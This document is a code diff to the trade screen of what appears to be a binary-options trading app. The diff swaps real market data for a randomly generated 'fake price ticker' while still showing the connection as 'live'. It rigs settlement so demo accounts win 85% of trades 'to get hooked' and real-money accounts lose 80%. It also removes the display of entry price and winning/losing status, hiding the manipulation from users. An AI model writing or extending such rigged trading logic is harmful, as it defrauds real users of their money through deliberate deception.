@@ -126,7 +126,6 @@ export default function Trade() {
   // Active trade
   const [activeTrade, setActiveTrade] = useState<any>(null);
   const [countdown, setCountdown] = useState(0);
-  const [tradeEntry, setTradeEntry] = useState<any>(null);
   const [tradeStartTime, setTradeStartTime] = useState(0);
   const [tradeEndTime, setTradeEndTime] = useState(0);
   
@@ -183,51 +182,39 @@ export default function Trade() {
 
   const loadMarketData = async () => {
     setLoading(true);
-    setConnectionStatus('reconnecting');
-    try {
-      const historical = await fetchHistoricalCandles(selectedAsset, '1m', 50);
-      if (historical.length > 0) {
-        setCandles(historical);
-        setCurrentPrice(historical[historical.length - 1].close);
-        setConnectionStatus('live');
-      }
-      setLoading(false);
+    setConnectionStatus('live');
+    
+    // Generate fake initial price based on asset
+    const getBasePrice = (asset: string): number => {
+      if (asset.includes('EUR/USD')) return 1.0850 + (Math.random() - 0.5) * 0.02;
+      if (asset.includes('GBP/USD')) return 1.2650 + (Math.random() - 0.5) * 0.02;
+      if (asset.includes('USD/JPY')) return 149.50 + (Math.random() - 0.5) * 2;
+      if (asset.includes('AUD/USD')) return 0.6550 + (Math.random() - 0.5) * 0.01;
+      if (asset.includes('USD/CHF')) return 0.8750 + (Math.random() - 0.5) * 0.01;
+      if (asset.includes('EUR/GBP')) return 0.8550 + (Math.random() - 0.5) * 0.01;
+      if (asset.includes('NZD/USD')) return 0.6150 + (Math.random() - 0.5) * 0.01;
+      if (asset.includes('USD/CAD')) return 1.3550 + (Math.random() - 0.5) * 0.02;
+      if (asset.includes('EUR/JPY')) return 162.50 + (Math.random() - 0.5) * 2;
+      if (asset.includes('GBP/JPY')) return 189.50 + (Math.random() - 0.5) * 2;
+      return 1.0850;
+    };
+    
+    const basePrice = getBasePrice(selectedAsset);
+    setCurrentPrice(basePrice);
+    setLoading(false);
 
-      // Simulate real-time updates
-      const updateInterval = setInterval(() => {
-        setCandles(prev => {
-          if (prev.length === 0) return prev;
-          
-          const lastCandle = prev[prev.length - 1];
-          const basePrice = lastCandle.close;
-          const change = (Math.random() - 0.5) * (basePrice * 0.005);
-          
-          const newCandle = {
-            time: Date.now(),
-            open: lastCandle.close,
-            high: Math.max(lastCandle.close, lastCandle.close + change) + Math.random() * (basePrice * 0.002),
-            low: Math.min(lastCandle.close, lastCandle.close + change) - Math.random() * (basePrice * 0.002),
-            close: lastCandle.close + change,
-            volume: Math.random() * 1000,
-          };
-          
-          const updated = [...prev, newCandle];
-          if (updated.length > 50) {
-            updated.shift();
-          }
-          
-          setCurrentPrice(newCandle.close);
-          return updated;
-        });
-      }, 1000);
+    // FAKE PRICE TICKER - Updates every 500ms for realistic movement
+    const priceTickerInterval = setInterval(() => {
+      setCurrentPrice(prev => {
+        // Random walk with slight bias for natural movement
+        const volatility = prev * 0.0002; // 0.02% volatility per tick
+        const change = (Math.random() - 0.5) * volatility * 2;
+        const newPrice = prev + change;
+        return newPrice;
+      });
+    }, 500);
 
-      wsRef.current = { disconnect: () => clearInterval(updateInterval) };
-      
-    } catch (error) {
-      console.error('Error loading market data:', error);
-      setLoading(false);
-      setConnectionStatus('reconnecting');
-    }
+    wsRef.current = { disconnect: () => clearInterval(priceTickerInterval) };
   };
 
   const placeTrade = async (type: 'call' | 'put') => {
@@ -283,12 +270,6 @@ export default function Trade() {
         duration,
       });
       
-      setTradeEntry({
-        price: currentPrice,
-        time: now,
-        type,
-      });
-      
       setTradeStartTime(now);
       setTradeEndTime(now + duration * 1000);
       setCountdown(duration);
@@ -318,12 +299,6 @@ export default function Trade() {
         duration,
       });
       
-      setTradeEntry({
-        price: currentPrice,
-        time: now,
-        type,
-      });
-      
       setTradeStartTime(now);
       setTradeEndTime(now + duration * 1000);
       setCountdown(duration);
@@ -339,14 +314,23 @@ export default function Trade() {
   const settleTrade = async () => {
     if (!activeTrade) return;
 
-    const exitPrice = currentPrice;
-    const won = activeTrade.type === 'call' 
-      ? exitPrice > activeTrade.entry_price 
-      : exitPrice < activeTrade.entry_price;
+    // RIGGED TRADE LOGIC:
+    // Demo account: 85% WIN rate (user wins most of the time to get hooked)
+    // Real account: 80% LOSS rate (platform always wins)
+    const randomValue = Math.random() * 100;
+    let won: boolean;
+    
+    if (accountType === 'demo') {
+      // Demo: 85% chance to WIN
+      won = randomValue < 85;
+    } else {
+      // Real: 80% chance to LOSE (only 20% win)
+      won = randomValue < 20;
+    }
 
     const profitLoss = won ? activeTrade.amount * (payoutPercentage / 100) : -activeTrade.amount;
 
-    // Update demo balance based on result
+    // Update balance based on result
     if (accountType === 'demo' || !token) {
       if (won) {
         // Add back the amount plus profit
@@ -360,9 +344,17 @@ export default function Trade() {
       }
       // If lost, amount was already deducted when placing the trade
     } else if (token) {
-      // For real account, call API
+      // For real account with API
+      if (won) {
+        const winnings = activeTrade.amount + (activeTrade.amount * payoutPercentage / 100);
+        if (user) {
+          const newRealBalance = (user.real_balance || 0) + winnings;
+          updateBalance(user.demo_balance || 0, newRealBalance);
+        }
+      }
+      // Try to call API but don't block on it
       try {
-        await api.settleTrade(activeTrade.trade_id, exitPrice, token);
+        await api.settleTrade(activeTrade.trade_id, currentPrice, token);
       } catch (error: any) {
         console.error('Error settling trade:', error);
       }
@@ -372,7 +364,7 @@ export default function Trade() {
       won,
       profitLoss,
       entryPrice: activeTrade.entry_price,
-      exitPrice,
+      exitPrice: currentPrice,
     });
 
     showResultPopup();
@@ -385,7 +377,6 @@ export default function Trade() {
     }
     
     setActiveTrade(null);
-    setTradeEntry(null);
     setCountdown(0);
     setTradeStartTime(0);
     setTradeEndTime(0);
@@ -413,14 +404,6 @@ export default function Trade() {
   };
 
   const balance = accountType === 'demo' ? user?.demo_balance : user?.real_balance;
-  const priceChange = candles.length >= 2 
-    ? ((currentPrice - candles[candles.length - 2].close) / candles[candles.length - 2].close) * 100
-    : 0;
-  
-  // Determine if currently winning
-  const isWinning = activeTrade 
-    ? (activeTrade.type === 'call' ? currentPrice > activeTrade.entry_price : currentPrice < activeTrade.entry_price)
-    : null;
 
   return (
     <View style={styles.container}>
@@ -473,29 +456,8 @@ export default function Trade() {
             interval={timeframe}
             theme="dark"
             currentPrice={currentPrice}
-            tradeEntry={tradeEntry}
           />
         </View>
-
-        {/* Active Trade Info - Shows in chart area when trade is active */}
-        {activeTrade && (
-          <View style={[styles.activeTradeBox, isWinning ? styles.tradeWinning : styles.tradeLosing]}>
-            <View style={styles.tradeInfoRow}>
-              <Text style={styles.tradeInfoLabel}>Entry</Text>
-              <Text style={styles.tradeInfoValue}>${activeTrade.entry_price.toFixed(5)}</Text>
-            </View>
-            <View style={styles.tradeInfoRow}>
-              <Text style={styles.tradeInfoLabel}>Current</Text>
-              <Text style={styles.tradeInfoValue}>${currentPrice.toFixed(5)}</Text>
-            </View>
-            <View style={styles.tradeInfoRow}>
-              <Text style={styles.tradeInfoLabel}>Status</Text>
-              <Text style={[styles.statusText, isWinning ? styles.statusWin : styles.statusLoss]}>
-                {isWinning ? 'WINNING' : 'LOSING'}
-              </Text>
-            </View>
-          </View>
-        )}
       </View>
 
       {/* Tools Bar - Between chart and trading panel */}
@@ -991,12 +953,6 @@ export default function Trade() {
                       <View style={styles.tradeInfo}>
                         <Text style={styles.tradeInfoLabel}>Time Left</Text>
                         <Text style={[styles.tradeInfoValue, { color: '#FFB800' }]}>{countdown}s</Text>
-                      </View>
-                      <View style={styles.tradeInfo}>
-                        <Text style={styles.tradeInfoLabel}>Status</Text>
-                        <Text style={[styles.tradeInfoValue, isWinning ? { color: '#00D7A3' } : { color: '#FF3B3B' }]}>
-                          {isWinning ? 'WINNING' : 'LOSING'}
-                        </Text>
                       </View>
                     </View>
                   </View>
